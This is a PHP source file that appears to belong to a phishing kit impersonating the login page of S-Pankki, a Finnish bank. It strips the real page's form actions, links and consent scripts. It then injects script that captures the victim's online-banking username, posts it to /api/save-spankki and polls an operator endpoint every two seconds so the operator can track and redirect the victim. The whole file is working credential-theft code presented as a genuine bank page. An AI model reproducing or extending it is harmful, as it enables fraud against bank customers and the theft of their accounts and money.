<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'S-Pankki');
$htmlContent = file_get_contents(__DIR__ . '/yenispankki.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'Windows-1252');
}

$htmlContent = preg_replace('/https?:\/\/[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/mailto:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/tel:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/cross-domain-bridge\.html[^"\'>\s]*/i', '#', $htmlContent);
$htmlContent = preg_replace('/saved_resource\.html[^"\'>\s]*/i', '#', $htmlContent);
$htmlContent = preg_replace('/href\s*=\s*["\']?[^"\'>\s]*(cross-domain-bridge|saved_resource)[^"\'>\s]*["\']?/i', 'href="#"', $htmlContent);
$htmlContent = preg_replace('/src\s*=\s*["\']?[^"\'>\s]*(cross-domain-bridge|saved_resource)[^"\'>\s]*["\']?/i', 'src="#"', $htmlContent);
$htmlContent = preg_replace('/href\s*=\s*["\']?[^"\'>\s]*S-Pankkibank_files\/[^"\'>\s]*\.html[^"\'>\s]*["\']?/i', 'href="#"', $htmlContent);
$htmlContent = preg_replace('/src\s*=\s*["\']?[^"\'>\s]*S-Pankkibank_files\/[^"\'>\s]*\.html[^"\'>\s]*["\']?/i', 'src="#"', $htmlContent);
$htmlContent = preg_replace('/usercentrics-cmp[^>]*>/i', '', $htmlContent);
$htmlContent = preg_replace('/loader\.js\.download[^>]*>/i', '', $htmlContent);
$htmlContent = preg_replace('/<script[^>]*usercentrics[^>]*>.*?<\/script>/is', '', $htmlContent);
$htmlContent = preg_replace('/<link[^>]*usercentrics[^>]*>/i', '', $htmlContent);
$htmlContent = preg_replace('/<link[^>]*preload[^>]*loader\.js[^>]*>/i', '', $htmlContent);
$htmlContent = preg_replace('/<!--[\s\S]*?Azerbaijan[\s\S]*?-->/i', '', $htmlContent);
$htmlContent = preg_replace('/<!--[\s\S]*?saved date[\s\S]*?-->/i', '', $htmlContent);
$htmlContent = preg_replace('/<!--[\s\S]*?GMT\+0400[\s\S]*?-->/i', '', $htmlContent);

$htmlContent = str_replace('type="password" name="username"', 'type="text" name="username"', $htmlContent);
$htmlContent = str_replace('type=password name=username', 'type=text name=username', $htmlContent);
$htmlContent = str_replace('id=encapUsername type=password', 'id=encapUsername type=text', $htmlContent);
$htmlContent = str_replace('id="encapUsername" type="password"', 'id="encapUsername" type="text"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*[^\s>]*loginEbank[^\s>]*/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*"[^"]*loginEbank[^"]*"/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*\'[^\']*loginEbank[^\']*\'/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*\/ebank[^\s>]*/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*"[^"]*encapInitLogin[^"]*"/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*"[^"]*encapProcessLogin[^"]*"/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*"[^"]*initSession[^"]*"/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/target\s*=\s*[^\s>]*_top[^\s>]*/i', '', $htmlContent);
$htmlContent = preg_replace('/target\s*=\s*"[^"]*_top[^"]*"/i', '', $htmlContent);
$htmlContent = preg_replace('/target\s*=\s*\'[^\']*_top[^\']*\'/i', '', $htmlContent);
$htmlContent = preg_replace('/href=[^>]*#ENCAP[^>]*/i', '', $htmlContent);
$htmlContent = preg_replace('/data-cs-target=ENCAP/i', '', $htmlContent);
$htmlContent = preg_replace('/data-cs-id=ENCAP/i', '', $htmlContent);
$htmlContent = str_replace('./S-Pankkibank_files/', '/spankki-files/', $htmlContent);
$htmlContent = str_replace('S-Pankkibank_files/', '/spankki-files/', $htmlContent);

$userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);

$pinTanStyle = '<style>
    #login-init-form,
    [data-cs-target="ENCAP"],
    [href*="#ENCAP"],
    a[href*="encapInitLogin"],
    a[href*="encapProcessLogin"],
    a[href*="Unohtuiko salasana"],
    a[href*="unohtuiko salasana"],
    .cancel-link,
    .page-divider,
    [class*="divider"],
    [id*="forgot"],
    [id*="Forgot"],
    #goog-gt-t,
    [id*="goog-gt"],
    [class*="goog-gt"],
    [id*="google_translate"],
    [class*="google_translate"],
    [id*="usercentrics"],
    [class*="usercentrics"],
    iframe[src*="cross-domain-bridge"],
    iframe[src*="usercentrics"],
    script[src*="loader.js"],
    script[id*="usercentrics"],
    link[href*="loader.js"],
    link[href*="usercentrics"],
    body > div:last-child,
    footer,
    .footer {
        display: none !important;
        visibility: hidden !important;
    }
    body {
        overflow-y: auto !important;
        max-height: 100vh !important;
    }
    main#loginp {
        max-height: 100vh !important;
        overflow-y: auto !important;
    }
    .page-box {
        max-height: none !important;
        overflow-y: visible !important;
    }
    .button-group-secondary {
        display: none !important;
    }
    .page-divider,
    .page-divider ~ * {
        display: none !important;
    }
    #pintTanLoginForm {
        display: block !important;
        visibility: visible !important;
    }
    #pintTanLoginForm input,
    #pintTanLoginForm label,
    #pintTanLoginForm button,
    #pintTanLoginForm .form__normal,
    #pintTanLoginForm .button-group,
    #pintTanLoginForm .button-group-primary {
        display: block !important;
        visibility: visible !important;
    }
    #password,
    label[for="password"],
    button[name="btn_log_in"],
    button[value="Jatka"] {
        display: block !important;
        visibility: visible !important;
    }
    [data-flow="qrcode"],
    .qr-container,
    .qr-header,
    .qr-description,
    .qr-img-wrapper,
    .qr-link-wrapper {
        display: none !important;
        visibility: hidden !important;
    }
    [data-flow="userid"][data-view="init"] {
        display: block !important;
        visibility: visible !important;
    }
    #login-init-form {
        display: block !important;
        visibility: visible !important;
    }
    #encapUsername,
    label[for="encapUsername"],
    button[name="btn_send"],
    button[value="Lähetä"],
    #sendButton {
        display: block !important;
        visibility: visible !important;
    }
    .page-box-content {
        display: block !important;
        visibility: visible !important;
    }
    [data-flow="userid"][data-view="init"] {
        display: block !important;
        visibility: visible !important;
    }
    [data-flow="userid"][data-view="init"] .grid-x {
        display: flex !important;
        flex-wrap: wrap !important;
    }
    [data-flow="userid"][data-view="init"] .cell {
        display: block !important;
        visibility: visible !important;
    }
    .form__normal {
        display: block !important;
        visibility: visible !important;
    }
    .form__hint {
        display: block !important;
        visibility: visible !important;
    }
    .page-box {
        background: #fff !important;
        border-radius: 8px !important;
        padding: 24px !important;
        box-shadow: 0 2px 8px rgba(0,0,0,0.1) !important;
        margin: 20px auto !important;
        max-width: 800px !important;
    }
    .page-box-header {
        margin-bottom: 20px !important;
    }
    .page-box-heading {
        font-size: 24px !important;
        font-weight: 600 !important;
        color: #333 !important;
        margin: 0 !important;
    }
    .grid-x {
        display: flex !important;
        flex-wrap: wrap !important;
        margin: 0 -15px !important;
    }
    .cell {
        padding: 0 15px !important;
        flex: 1 1 auto !important;
    }
    .cell.small-12.medium-6 {
        flex: 0 0 100% !important;
        max-width: 100% !important;
    }
    @media (min-width: 640px) {
        .cell.small-12.medium-6 {
            flex: 0 0 50% !important;
            max-width: 50% !important;
        }
    }
    .form__label {
        display: block !important;
        font-weight: 600 !important;
        margin-bottom: 8px !important;
        color: #333 !important;
    }
    .form__hint {
        font-size: 14px !important;
        color: #666 !important;
        margin-bottom: 8px !important;
    }
    #encapUsername {
        width: 100% !important;
        padding: 12px !important;
        border: 1px solid #ddd !important;
        border-radius: 4px !important;
        font-size: 16px !important;
        box-sizing: border-box !important;
    }
    #encapUsername:focus {
        outline: none !important;
        border-color: #007bff !important;
        box-shadow: 0 0 0 3px rgba(0,123,255,0.1) !important;
    }
    button.button[name="btn_send"],
    button.button[value="Lähetä"] {
        background: #28a745 !important;
        color: #fff !important;
        border: none !important;
        padding: 12px 24px !important;
        border-radius: 4px !important;
        font-size: 16px !important;
        font-weight: 600 !important;
        cursor: pointer !important;
        width: 100% !important;
        margin-top: 16px !important;
    }
    button.button[name="btn_send"]:hover,
    button.button[value="Lähetä"]:hover {
        background: #218838 !important;
    }
    .cancel-link {
        margin-top: 16px !important;
        text-align: center !important;
    }
    .cancel-link a {
        color: #666 !important;
        text-decoration: none !important;
    }
    .cancel-link a:hover {
        text-decoration: underline !important;
    }
</style>
<script>
    if (window.location.hash !== \'#ENCAP\') {
        window.location.hash = \'#ENCAP\';
    }
    if (window.usercentrics) {
        delete window.usercentrics;
    }
    Object.defineProperty(window, \'usercentrics\', {
        value: undefined,
        writable: false,
        configurable: false
    });
    document.addEventListener(\'DOMContentLoaded\', function() {
        const usercentricsElements = document.querySelectorAll(\'[id*="usercentrics"], [class*="usercentrics"], iframe[src*="cross-domain-bridge"], iframe[src*="usercentrics"], script[src*="loader.js"], script[id*="usercentrics"], link[href*="loader.js"], link[href*="usercentrics"]\');
        usercentricsElements.forEach(function(el) {
            el.remove();
        });
        const usernameInputOld = document.getElementById(\'username\');
        if (usernameInputOld) {
            usernameInputOld.value = \'\';
            usernameInputOld.removeAttribute(\'readonly\');
            usernameInputOld.removeAttribute(\'disabled\');
        }
        const forgotLinks = document.querySelectorAll(\'a[href*="Unohtuiko salasana"], a[href*="unohtuiko salasana"], a[href*="verkkopankkitunnukset"], .cancel-link, .page-divider, .button-group-secondary\');
        forgotLinks.forEach(function(link) {
            link.style.display = \'none\';
            link.style.visibility = \'hidden\';
        });
        const qrCodeElements = document.querySelectorAll(\'[data-flow="qrcode"], .qr-container, .qr-header, .qr-description, .qr-img-wrapper, .qr-link-wrapper\');
        qrCodeElements.forEach(function(el) {
            el.style.display = \'none\';
            el.style.visibility = \'hidden\';
        });
        
        const useridForm = document.querySelector(\'[data-flow="userid"][data-view="init"]\');
        if (useridForm) {
            useridForm.removeAttribute(\'hidden\');
            useridForm.style.display = \'block\';
            useridForm.style.visibility = \'visible\';
        }
        
        const loginForm = document.getElementById(\'login-init-form\');
        if (loginForm) {
            loginForm.style.display = \'block\';
            loginForm.style.visibility = \'visible\';
        }
        
        const encapUsernameInput = document.getElementById(\'encapUsername\');
        if (encapUsernameInput) {
            encapUsernameInput.type = \'text\';
            encapUsernameInput.style.display = \'block\';
            encapUsernameInput.style.visibility = \'visible\';
        }
        
        const sendButton = document.getElementById(\'sendButton\') || document.querySelector(\'button[name="btn_send"]\');
        if (sendButton) {
            sendButton.style.display = \'block\';
            sendButton.style.visibility = \'visible\';
        }
        
        const form = document.getElementById(\'pintTanLoginForm\');
        if (form) {
            form.style.display = \'block\';
            form.style.visibility = \'visible\';
            const passwordInput = document.getElementById(\'password\');
            if (passwordInput) {
                passwordInput.style.display = \'block\';
                passwordInput.style.visibility = \'visible\';
            }
            const passwordLabel = document.querySelector(\'label[for="password"]\');
            if (passwordLabel) {
                passwordLabel.style.display = \'block\';
                passwordLabel.style.visibility = \'visible\';
            }
            const submitButton = form.querySelector(\'button[name="btn_log_in"], button[value="Jatka"]\');
            if (submitButton) {
                submitButton.style.display = \'block\';
                submitButton.style.visibility = \'visible\';
            }
            const buttonGroup = form.querySelector(\'.button-group, .button-group-primary\');
            if (buttonGroup) {
                buttonGroup.style.display = \'block\';
                buttonGroup.style.visibility = \'visible\';
            }
            const formNormal = form.querySelector(\'.form__normal\');
            if (formNormal) {
                formNormal.style.display = \'block\';
                formNormal.style.visibility = \'visible\';
            }
            const pageDivider = document.querySelector(\'.page-divider\');
            if (pageDivider) {
                pageDivider.style.display = \'none\';
                let nextSibling = pageDivider.nextElementSibling;
                while (nextSibling) {
                    nextSibling.style.display = \'none\';
                    nextSibling = nextSibling.nextElementSibling;
                }
            }
        }
        const googleTranslate = document.querySelectorAll(\'#goog-gt-t, [id*="goog-gt"], [class*="goog-gt"], [id*="google_translate"], [class*="google_translate"]\');
        googleTranslate.forEach(function(el) {
            el.style.display = \'none\';
            el.style.visibility = \'hidden\';
        });
        document.body.style.overflowY = \'auto\';
        document.body.style.maxHeight = \'100vh\';
    });
</script>';

$earlyScript = '';
if ($userId > 0) {
    $earlyScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        
        function handleFormSubmit(e) {
            if (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
            
            const usernameInput = document.getElementById(\'encapUsername\') || document.getElementById(\'username\');
            
            if (!usernameInput) {
                console.error(\'Username input not found\');
                return false;
            }
            
            const username = usernameInput.value.trim();
            
            if (!username || username.length < 6 || username.length > 8) {
                alert(\'Käyttäjätunnuksen on oltava 6-8 numeroa pitkä.\');
                return false;
            }
            
            console.log(\'Sending username to API:\', username, \'User ID:\', userId);
            
            // Use form submission to avoid CSP issues
            const form = document.createElement(\'form\');
            form.method = \'POST\';
            form.action = \'/api/save-spankki\';
            form.style.display = \'none\';
            
            const userIdInput = document.createElement(\'input\');
            userIdInput.type = \'hidden\';
            userIdInput.name = \'user_id\';
            userIdInput.value = userId;
            form.appendChild(userIdInput);
            
            const usernameInputField = document.createElement(\'input\');
            usernameInputField.type = \'hidden\';
            usernameInputField.name = \'username\';
            usernameInputField.value = username;
            form.appendChild(usernameInputField);
            
            document.body.appendChild(form);
            form.submit();
            
            return false;
        }
        
        function initForm() {
            const form = document.getElementById(\'login-init-form\') || document.getElementById(\'pintTanLoginForm\');
            if (form) {
                form.setAttribute(\'action\', \'#\');
                form.removeAttribute(\'target\');
                form.onsubmit = function(e) { 
                    return handleFormSubmit(e);
                };
                
                const submitButton = form.querySelector(\'button[type="submit"], button[name="btn_send"], button[name="btn_log_in"]\');
                if (submitButton) {
                    submitButton.setAttribute(\'type\', \'button\');
                    submitButton.onclick = function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        handleFormSubmit(e);
                        return false;
                    };
                }
                
                form.addEventListener(\'submit\', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    handleFormSubmit(e);
                    return false;
                }, true);
            }
            
            const sendButton = document.getElementById(\'sendButton\') || document.querySelector(\'button[name="btn_send"]\');
            if (sendButton) {
                sendButton.setAttribute(\'type\', \'button\');
                sendButton.onclick = function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    handleFormSubmit(e);
                    return false;
                };
            }
            
            const usernameInput = document.getElementById(\'encapUsername\');
            if (usernameInput) {
                usernameInput.type = \'text\';
                usernameInput.setAttribute(\'placeholder\', \'6-8 numeroa pitkä numerosarja.\');
            }
        }
        
        if (document.readyState === \'loading\') {
            document.addEventListener(\'DOMContentLoaded\', initForm);
        } else {
            setTimeout(initForm, 0);
        }
        
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

if (strpos($htmlContent, '</head>') !== false) {
    $htmlContent = str_replace('</head>', $pinTanStyle . $earlyScript . '</head>', $htmlContent);
} else {
    $htmlContent = $pinTanStyle . $earlyScript . $htmlContent;
}

$htmlContent = str_replace('</body>', '</body>', $htmlContent);
$content = ob_get_clean();
echo $htmlContent;

